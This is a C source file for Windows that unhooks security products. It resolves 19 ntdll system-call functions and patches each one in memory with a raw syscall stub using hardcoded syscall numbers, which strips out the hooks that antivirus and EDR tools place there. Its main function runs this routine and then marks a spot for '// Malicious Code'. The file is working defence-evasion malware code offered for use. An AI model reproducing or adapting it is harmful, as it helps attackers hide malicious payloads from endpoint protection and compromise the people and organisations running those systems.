#include <Windows.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

VOID PatchHook(CHAR* address, unsigned char id, char high);

VOID CleanUp() {
    HANDLE hDll = LoadLibrary("ntdll.dll");
    FARPROC NtAllocateVirtualMemory = GetProcAddress(hDll, "NtAllocateVirtualMemory");
    FARPROC NtAllocateVirtualMemoryEx = GetProcAddress(hDll, "NtAllocateVirtualMemoryEx");
    FARPROC NtDeviceIoControlFile = GetProcAddress(hDll, "NtDeviceIoControlFile");
    FARPROC NtGetContextThread = GetProcAddress(hDll, "NtGetContextThread");
    FARPROC NtMapViewOfSection = GetProcAddress(hDll, "NtMapViewOfSection");
    FARPROC NtMapViewOfSectionEx = GetProcAddress(hDll, "NtMapViewOfSectionEx");
    FARPROC NtProtectVirtualMemory = GetProcAddress(hDll, "NtProtectVirtualMemory");
    FARPROC NtQueryInformationThread = GetProcAddress(hDll, "NtQueryInformationThread");
    FARPROC NtQueueApcThread = GetProcAddress(hDll, "NtQueueApcThread");
    FARPROC NtQueueApcThreadEx = GetProcAddress(hDll, "NtQueueApcThreadEx");
    FARPROC NtReadVirtualMemory = GetProcAddress(hDll, "NtReadVirtualMemory");
    FARPROC NtResumeThread = GetProcAddress(hDll, "NtResumeThread");
    FARPROC NtSetContextThread = GetProcAddress(hDll, "NtSetContextThread");
    FARPROC NtSetInformationProcess = GetProcAddress(hDll, "NtSetInformationProcess");
    FARPROC NtSetInformationThread = GetProcAddress(hDll, "NtSetInformationThread");
    FARPROC NtSuspendThread = GetProcAddress(hDll, "NtSuspendThread");
    FARPROC NtUnmapViewOfSection = GetProcAddress(hDll, "NtUnmapViewOfSection");
    FARPROC NtUnmapViewOfSectionEx = GetProcAddress(hDll, "NtUnmapViewOfSectionEx");
    FARPROC NtWriteVirtualMemory = GetProcAddress(hDll, "NtWriteVirtualMemory");

    PatchHook(NtProtectVirtualMemory, 0x50, 0x00);  // unhooking first since we are going to need it to unhook APIs
    PatchHook(NtAllocateVirtualMemory, 0x18, 0x00);
    PatchHook(NtAllocateVirtualMemoryEx, 0x76, 0x00);
    PatchHook(NtDeviceIoControlFile, 0x7, 0x00);
    PatchHook(NtGetContextThread, 0xf2, 0x00);
    PatchHook(NtMapViewOfSection, 0x28, 0x00);
    PatchHook(NtMapViewOfSectionEx, 0x14, 0x01);
    PatchHook(NtQueryInformationThread, 0x25, 0x00);
    PatchHook(NtQueueApcThread, 0x45, 0x00);
    PatchHook(NtQueueApcThreadEx, 0x65, 0x01);
    PatchHook(NtReadVirtualMemory, 0x3f, 0x00);
    PatchHook(NtResumeThread, 0x52, 0x00);
    PatchHook(NtSetContextThread, 0x8b, 0x01);
    PatchHook(NtSetInformationProcess, 0x1c, 0x00);
    PatchHook(NtSetInformationThread, 0x0d, 0x00);
    PatchHook(NtSuspendThread, 0xbc, 0x01);
    PatchHook(NtUnmapViewOfSection, 0x2a, 0x00);
    PatchHook(NtUnmapViewOfSectionEx, 0xcc, 0x01);
    PatchHook(NtWriteVirtualMemory, 0x3a, 0x00);
    
    CloseHandle(hDll);
}

VOID PatchHook(CHAR* address, unsigned char id, char high) {
    CHAR* patch_address = address + 3;
    // \xb8\xXX\xHH\x00\x00\x0f\x05\xc3
    unsigned long long patch = 0xc3050f00000000b8;
    unsigned long long syscall = patch + (id << 8);
    syscall += high << 16;

    DWORD dwOld;
    VirtualProtect(patch_address, sizeof(unsigned long long), PAGE_EXECUTE_READWRITE, &dwOld);
    memcpy(patch_address, &syscall, sizeof(unsigned long long));
}

int main (int argc, char **argv) {
    CleanUp();

    // Malicious Code

    return 0;
}
